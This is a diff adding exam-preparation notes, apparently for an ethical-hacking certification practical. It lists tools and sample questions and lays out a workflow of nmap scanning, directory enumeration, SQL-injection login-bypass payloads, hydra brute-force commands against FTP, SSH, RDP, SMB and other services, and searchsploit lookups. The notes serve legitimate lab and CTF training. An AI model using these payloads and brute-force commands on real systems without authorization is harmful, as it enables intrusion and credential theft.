@@ -4,7 +4,6 @@ If you have money, you can afford iLabs because the challenges are based on the 
 
 If you can’t afford iLab, there are many platforms in which you can practice the listed tools. I personally prefer TryHackMe and HackTheBox. This Exam is all about how much knowledge you have on tools.
 
-\
 
 
 
@@ -324,9 +323,96 @@ If you get any questions related to netbios, SMB use metasploit.
 
 
 
+Tools Used da Technology Hacks (video):
+
+**in Parrot Box:**
+
+netdiscover, nmap, hydra, john the ripper, wpscan, sqlmap, ADB
+
+**In Windows Box:**
+
+Wireshark, Hashcalc, Veracrypt, BCTextEncoder, Cryptool, Snow, OpenStego
+
+**Others exam questions:**
+
+* How many machines are active? Use netdiscover
+* Which machine has FTP Server open? Use nmap
+* Find 2 secret files using FTP? brute force FTP username and psw.
+* Find out phone number of Web application user? Use sqlmap
+* Brute force Wordpress  website user's psw? Use wpscan
+* Decode .hex file? Use Cryptool
+* Which machine started DOS attack? DDOS attack happened on which IP? Find out http crediantls from PCAP file? Use wireshark
+* Decode the given text using given secret? Use BCTextEncorder
+* Calculate SHA1 hash of a text? Use Hashcalc
+* Decrypt the hidden vulume and find secret file? Use Veracrypt.
+* Crack the given hash? Use hashes.com
+* Find secret hidden int he image/file? Usen openstego/snow
+* Find a secret file in Android? Use ADB
+* Send data to another machine (firewall blocked)? Use Covert TCP.
 
 
 
+### My Initial way of approaching Exam/ Vuln CTF Boxes: <a href="#fed1" id="fed1"></a>
+
+1. **netdiscover -i eth0** — This will help me to get the machines available on our network. \[ **eth0 may differ if VPN network I will be tun0** ]
+2. Once I get the IP’s I will run my **Nmap** on all those IP’s.
+3. **nmap -p- 10.10.10.10 \[ Any IP ]**
+
+Once I ran the above command I will get all the opened port on that target and then with that open port, I will run another nmap, for example, if port 443,80,53,135,8080,8888 are opened then my nmap command will be.
+
+4\. **nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10**
+
+This will find out the OS version, service version, and ran default nmap script and store the output. Storing output is very important, you may need to refer it many times.
+
+5\. While nmap is running I will open all the IPs on browser and will see whether any web service is running on not, if Yes then I will run gobuster or dirb.
+
+**gobuster -e -u** [**http://10.10.10.10**](http://192.168.0.155/) **-w wordlsit.txt**
+
+**dirb** [**http://**](http://192.168.1.224/)**10.10.10.10 wordlist.txt**
+
+6\. If I find any login page I will try SQLi manually
+
+```
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1—
+```
+
+7\. Brute Forcing services !! and making custom wordlists is always an added advantage but make sure the service won’t be down OR lock you out from trying again.
+
+**Some of the default password list:**
+
+* [http://www.phenoelit.org/dpl/dpl.html](http://www.phenoelit.org/dpl/dpl.html)
+* [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)
+* [https://github.com/Dormidera/WordList-Compendium](https://github.com/Dormidera/WordList-Compendium)
+
+**Making custom wordlist from website keywords:**
+
+* **cewl** example.com -m 5 -w words.txt
+
+where **cewl** is the tool, **example.com** is the site, **-m** is to specify the minimum length of the word , **-w** is to specify the output file
+
+**Some of the service brute force with hydra:**
+
+* hydra -l root -P passwords.txt \[-t 32] \<IP> _**ftp**_
+* hydra -L usernames.txt -P pass.txt \<IP> _**mysql**_
+* hydra -l USERNAME -P /path/to/passwords.txt -f \<IP> _**pop3**_ -V
+* hydra -V -f -L \<userslist> -P \<passwlist> _**rdp**_://\<IP>
+* hydra -P common-snmp-community-strings.txt target.com _**snmp**_
+* hydra -l Administrator -P words.txt 192.168.1.12 _**smb**_ -t 1
+* hydra -l root -P passwords.txt \<IP> _**ssh**_
+
+**Searchsploit useful commands:**
+
+* searchsploit “Linux Kernel”
+* searchsploit -m 7618 — **Paste the exploit in the current directory**
+* searchsploit -p 7618\[.c] — **Show complete path**
+* searchsploit — nmap file.xml — **Search vulns inside a Nmap XML result**
 
 ### Some resource links will help you in the exam. <a href="#fa6c" id="fa6c"></a>
 
